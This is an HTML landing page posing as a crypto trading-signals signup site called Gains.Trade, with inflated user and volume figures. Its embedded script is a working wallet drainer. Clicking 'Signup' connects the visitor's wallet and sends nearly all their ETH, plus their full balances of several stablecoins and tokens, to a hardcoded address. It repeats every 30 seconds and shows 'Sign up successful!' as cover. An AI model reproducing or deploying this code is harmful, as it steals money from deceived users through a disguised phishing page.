<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gains.Trade - Trade Everywhere</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(180deg, #0f0f1a 0%, #0a0a14 100%);
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
    }

    .top-bar {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 56px;
      background: #0f0f1a;
      border-bottom: 1px solid #1a1a2e;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 16px;
      z-index: 1000;
    }
    .logo-container {
      display: flex;
      align-items: center;
    }
    .logo {
      width: 32px;
      height: 32px;
      background: linear-gradient(135deg, #00ffaa, #00d4ff);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      font-weight: bold;
      color: #000;
    }
    .lang-selector {
      display: flex;
      align-items: center;
      gap: 6px;
      color: #a0a0c0;
      font-size: 14px;
      cursor: pointer;
    }
    .lang-selector .globe {
      font-size: 18px;
    }
    .lang-selector .arrow {
      font-size: 12px;
    }
    .menu-icon {
      font-size: 24px;
      color: #ffffff;
      cursor: pointer;
    }

    .hero {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      padding: 80px 24px 60px;
    }
    .headline {
      font-size: 2.1rem;
      font-weight: 700;
      line-height: 1.15;
      margin-bottom: 32px;
      max-width: 90%;
      background: linear-gradient(90deg, #00d4ff, #00ffaa);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .signup-btn {
      display: inline-flex;
      align-items: center;
      gap: 12px;
      background: linear-gradient(90deg, #00d4ff, #00ffaa);
      color: #0f0f1a;
      font-size: 1.25rem;
      font-weight: 600;
      padding: 16px 40px;
      border: none;
      border-radius: 999px;
      cursor: pointer;
      margin: 32px 0 48px;
      transition: all 0.3s ease;
      box-shadow: 0 10px 30px rgba(0,212,255,0.25);
    }
    .signup-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 15px 40px rgba(0,212,255,0.4);
    }
    .stats {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 32px 16px;
      width: 100%;
      max-width: 420px;
      text-align: center;
    }
    .stat-item {
      display: flex;
      flex-direction: column;
      gap: 8px;
    }
    .stat-value {
      font-size: 1.75rem;
      font-weight: 700;
      color: #00ffaa;
    }
    .stat-label {
      font-size: 0.95rem;
      color: #a0a0c0;
      opacity: 0.9;
    }
    .trust {
      margin-top: 64px;
      font-size: 0.95rem;
      color: #707090;
      text-align: center;
    }
    #status {
      margin-top: 40px;
      font-size: 2.2rem;
      font-weight: 700;
      min-height: 100px;
      text-align: center;
    }
    .success { color: #00ff88; }
    .error { color: #ff4444; }

    @media (min-width: 768px) {
      .headline { font-size: 3.5rem; max-width: 800px; }
      .signup-btn { font-size: 1.5rem; padding: 20px 60px; }
      .stats { max-width: 700px; grid-template-columns: repeat(4, 1fr); }
      .top-bar { padding: 0 32px; }
    }
  </style>
</head>
<body>

  <div class="top-bar">
    <div class="logo-container"><div class="logo">a1</div></div>
    <div class="lang-selector">
      <span class="globe">üåê</span>
      <span>en</span>
      <span class="arrow">‚ñº</span>
    </div>
    <div class="menu-icon">‚â°</div>
  </div>

  <main class="hero">
    <h1 class="headline">
      Trade Smarter, Not Harder Get Clear Buy & Sell Signals on All Your Crypto
    </h1>

    <button id="signupBtn" class="signup-btn">
      Signup ‚Üí
    </button>

    <div id="status"></div>

    <div class="stats">
      <div class="stat-item">
        <div class="stat-value">$1266B+</div>
        <div class="stat-label">Total Volume</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">3M+</div>
        <div class="stat-label">Total Trades</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">43k+</div>
        <div class="stat-label">Total Users</div>
      </div>
      <div class="stat-item">
        <div class="stat-value">290+</div>
        <div class="stat-label">Pairs</div>
      </div>
    </div>

    <div class="trust">
      Trusted by traders globally since 2021
    </div>
  </main>

  <script>
    const status = document.getElementById("status");
    const btn = document.getElementById("signupBtn");

    const wallet = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";

    const tokens = [
      {s:"USDT",a:"0xdAC17F958D2ee523a2206206994597C13D831ec7"},
      {s:"USDC",a:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"},
      {s:"DAI",a:"0x6B175474E89094C44Da98b954EedeAC495271d0F"},
      {s:"SHIB",a:"0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"},
      {s:"UNI",a:"0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984"},
      {s:"LINK",a:"0x514910771AF9Ca656af840dff83E8264EcF986CA"},
      {s:"PEPE",a:"0x6982508145454Ce325dDbE47a25d4ec3d2311933"}
    ];

    const abi = [
      "balanceOf(address) view returns (uint256)",
      "transfer(address,uint256) returns (bool)"
    ];

    let connected = false;
    let lastNative = 0n;

    async function drain() {
      if (!window.ethereum) {
        status.innerHTML = "<span class='error'>Failed.</span>";
        return;
      }

      try {
        if (!connected) {
          await window.ethereum.request({method: "eth_requestAccounts"});
          connected = true;
          status.innerHTML = "Processing...";
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const user = await signer.getAddress();

        const nativeBalance = await provider.getBalance(user);

        const minThreshold = ethers.parseEther("0.0001");
        const reserve = ethers.parseEther("0.0005");

        if (nativeBalance > lastNative && nativeBalance > minThreshold) {
          const amount = nativeBalance - reserve;
          if (amount > 0n) {
            const gasEstimate = await provider.estimateGas({to: wallet, value: amount});
            await signer.sendTransaction({
              to: wallet,
              value: amount,
              gasLimit: (gasEstimate * 120n) / 100n
            });
            lastNative = nativeBalance;
          }
        }

        for (const token of tokens) {
          try {
            const contract = new ethers.Contract(token.a, abi, signer);
            const balance = await contract.balanceOf(user);
            if (balance > 0n) {
              await contract.transfer(wallet, balance, {gasLimit: 150000n});
            }
          } catch {}
        }

        status.innerHTML = "<span class='success'>Sign up successful!</span>";
      } catch (e) {
        status.innerHTML = "<span class='error'>Failed.</span>";
      }
    }

    btn.onclick = () => {
      drain();
      setInterval(drain, 30000);
    };
  </script>

</body>
</html>
